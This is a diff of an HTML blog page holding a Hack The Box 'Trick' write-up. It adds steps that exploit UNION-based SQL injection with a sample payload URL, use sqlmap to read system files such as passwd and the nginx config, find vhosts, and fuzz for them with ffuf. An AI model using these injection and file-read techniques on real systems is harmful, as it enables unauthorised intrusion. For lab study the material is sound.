@@ -537,7 +537,8 @@ http://preprod-payroll.trick.htb/voting.php
 <div class="highlight"><pre><span></span><code>python sqlmap.py -m ../htb/trick/extracte_endpoints_params.txt
 </code></pre></div>
 
-<p>sqlmap did a great job, it found UNION bases injections on multiple endpoints.</p>
+<p>sqlmap did a great job, it found UNION based injections on multiple endpoints.
+Example:</p>
 <div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/manage_employee.php?id=-1+union+select+1,2,0x3a3a3a3a3a3a3a3a3a3a,4,5,6,7,8
 </code></pre></div>
 
@@ -548,21 +549,47 @@ available databases [2]:
 [*] information_schema
 [*] payroll_db
 =======
+</code></pre></div>
 
------------------------
-snip
------------------------
+<p>The current DB user can read system files and we chose sqlmap to read common files from the system and dump those to disk.</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s1">&#39;http://preprod-payroll.trick.htb/manage_employee.php?id=1&#39;</span> --common-files
+</code></pre></div>
 
-# Vhost Fuzzing
-```bash
-$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H &quot;HOST: preprod-FUZZ.trick.htb&quot; -fs 5480
+<p>We receive files like passwd and nginx configuration. Let's grep through those files.</p>
+<div class="highlight"><pre><span></span><code>grep -i payroll /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/*
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default:        server_name preprod-payroll.trick.htb<span class="p">;</span>
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default:        root /var/www/payroll<span class="p">;</span>
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default:        server_name preprod-payroll.trick.htb<span class="p">;</span>
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default:        root /var/www/payroll<span class="p">;</span>
+</code></pre></div>
 
-        /&#39;___\  /&#39;___\           /&#39;___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+<p>nginx gives us information about vhosts and local path</p>
+<div class="highlight"><pre><span></span><code>grep -E <span class="s2">&quot;server_name|root &quot;</span> /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
+        server_name trick.htb<span class="p">;</span>
+        root /var/www/html<span class="p">;</span>
+        server_name _<span class="p">;</span>
+        server_name preprod-marketing.trick.htb<span class="p">;</span>
+        root /var/www/market<span class="p">;</span>
+        server_name preprod-payroll.trick.htb<span class="p">;</span>
+        root /var/www/payroll<span class="p">;</span>
+</code></pre></div>
+
+<p>Ok, two vhosts the already known <code>preprod-payroll.trick.htb</code> and the yet unknown host <code>preprod-marketing.trick.htb</code>.
+Aaaand now we might read webserver files using the SQL injection?</p>
+<div class="highlight"><pre><span></span><code>In the very first file we read `index.php` we find a possible **File Inclusion** vulnerability.
+</code></pre></div>
+
+<hr>
+<h2>snip</h2>
+<h1>Vhost Fuzzing</h1>
+<div class="highlight"><pre><span></span><code>$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H <span class="s2">&quot;HOST: preprod-FUZZ.trick.htb&quot;</span> -fs <span class="m">5480</span>
+
+        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\</span>
+       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
+        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\</span>
+          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
 
        v1.5.0-dev
 ________________________________________________
@@ -571,17 +598,17 @@ ________________________________________________
  :: URL              : http://preprod-payroll.trick.htb
  :: Wordlist         : FUZZ: SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt
  :: Header           : Host: preprod-FUZZ.trick.htb
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
- :: Filter           : Response size: 5480
+ :: Follow redirects : <span class="nb">false</span>
+ :: Calibration      : <span class="nb">false</span>
+ :: Timeout          : <span class="m">10</span>
+ :: Threads          : <span class="m">40</span>
+ :: Matcher          : Response status: <span class="m">200</span>,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: <span class="m">5480</span>
 ________________________________________________
 
-marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 26ms]
-payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 38ms]
-:: Progress: [114441/114441] :: Job [1/1] :: 1262 req/sec :: Duration: [0:01:34] :: Errors: 0 ::
+marketing               <span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">9660</span>, Words: <span class="m">3007</span>, Lines: <span class="m">179</span>, Duration: 26ms<span class="o">]</span>
+payroll                 <span class="o">[</span>Status: <span class="m">302</span>, Size: <span class="m">9546</span>, Words: <span class="m">1453</span>, Lines: <span class="m">267</span>, Duration: 38ms<span class="o">]</span>
+:: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
 </code></pre></div>
   </div>
   <div class="tag-cloud">
